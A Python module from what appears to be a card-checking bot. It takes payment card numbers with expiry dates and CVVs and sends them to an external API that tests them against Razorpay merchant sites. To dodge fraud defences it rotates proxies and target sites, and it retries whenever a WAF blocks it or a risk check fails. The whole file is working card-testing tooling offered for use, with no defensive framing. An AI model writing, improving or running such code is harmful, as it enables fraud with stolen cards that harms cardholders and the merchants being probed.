import asyncio
import aiohttp
import random
import logging
import os

import database

DEFAULT_API_BASE = "https://sincere-endurance-production-696e.up.railway.app"
RZ_API_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "rz_api.txt")

RZ_SITES_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "rz_sites.txt")

def _get_api_base():
    try:
        if os.path.exists(RZ_API_FILE):
            with open(RZ_API_FILE, "r", encoding="utf-8") as f:
                apis = [line.strip() for line in f if line.strip()]
            if apis:
                return random.choice(apis)
    except Exception:
        pass
    return DEFAULT_API_BASE

def _get_user_proxy(user_id):
    if not user_id:
        return None
    try:
        return database.get_random_proxy(user_id)
    except Exception as e:
        logging.error(f"[Razorpay API] DB proxy fetch error: {e}")
    return None

def _get_random_site():
    try:
        if os.path.exists(RZ_SITES_FILE):
            with open(RZ_SITES_FILE, "r", encoding="utf-8") as f:
                sites = [line.strip() for line in f if line.strip()]
            if sites:
                return random.choice(sites)
    except Exception:
        pass
    return None

def _get_all_sites():
    try:
        if os.path.exists(RZ_SITES_FILE):
            with open(RZ_SITES_FILE, "r", encoding="utf-8") as f:
                sites = [line.strip() for line in f if line.strip()]
            if sites:
                return sites
    except Exception:
        pass
    return []

def _normalize_year(yy):
    yy = yy.strip()
    if len(yy) == 2:
        return "20" + yy
    return yy

def _format_card(card):
    try:
        parts = card.strip().split("|")
        if len(parts) != 4:
            return None
        num, mm, yy, cvv = parts
        return f"{num}|{mm}|{_normalize_year(yy)}|{cvv}"
    except Exception:
        return None

async def _do_api_call(formatted_card, user_id=None, skip_proxy=False, site=None):
    api_base = _get_api_base()
    params = {"cc": formatted_card}
    if not skip_proxy:
        proxy = _get_user_proxy(user_id)
        if proxy:
            params["proxy"] = proxy
    if not site:
        site = _get_random_site()
    if site:
        params["site"] = site

    timeout = aiohttp.ClientTimeout(total=60)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        async with session.get(f"{api_base}/razorpay/", params=params) as resp:
            if resp.status == 200:
                return await resp.json()
            text = await resp.text()
            return {"status": "error", "response": f"API HTTP {resp.status}: {text[:100]}"}

async def check_gate(card: str, user_id: int = None) -> dict:
    try:
        formatted = _format_card(card)
        if not formatted:
            return {"status": "error", "response": "Invalid card format"}

        all_sites = _get_all_sites()
        for attempt in range(8):
            try:
                site = all_sites[attempt % len(all_sites)] if all_sites else None
                data = await _do_api_call(formatted, user_id, skip_proxy=(attempt == 7), site=site)
            except asyncio.TimeoutError:
                data = {"status": "error", "response": "API request timed out"}
            except Exception as e:
                data = {"status": "error", "response": f"API request failed: {str(e)[:60]}"}

            gate_status = data.get("status", "error").lower()
            api_response = data.get("response", "No response")

            if "payment successful" in api_response.lower():
                gate_status = "charged"
                api_response = "Pᴀʏᴍᴇɴᴛ Sᴜᴄᴄᴇꜱꜱꜰᴜʟ"

            if "payment_risk_check_failed" in api_response.lower():
                gate_status = "declined"
                api_response = "Pᴀʏᴍᴇɴᴛ Dᴇᴄʟɪɴᴇᴅ (Pᴀʏᴍᴇɴᴛ_Rɪꜱᴋ_Cʜᴇᴄᴋ_Fᴀɪʟᴇᴅ)"

            if "waf blocked" in api_response.lower():
                gate_status = "error"

            if "expectation failed" in api_response.lower():
                gate_status = "error"

            if "input_validation_failed" in api_response.lower():
                gate_status = "error"

            if gate_status == "error":
                if attempt < 7:
                    await asyncio.sleep(0.5)
                    continue

            return {"status": gate_status, "response": api_response}

    except Exception as e:
        logging.error(f"[Razorpay API] Unhandled error: {e}")
        return {"status": "error", "response": f"Gate error: {str(e)[:60]}"}
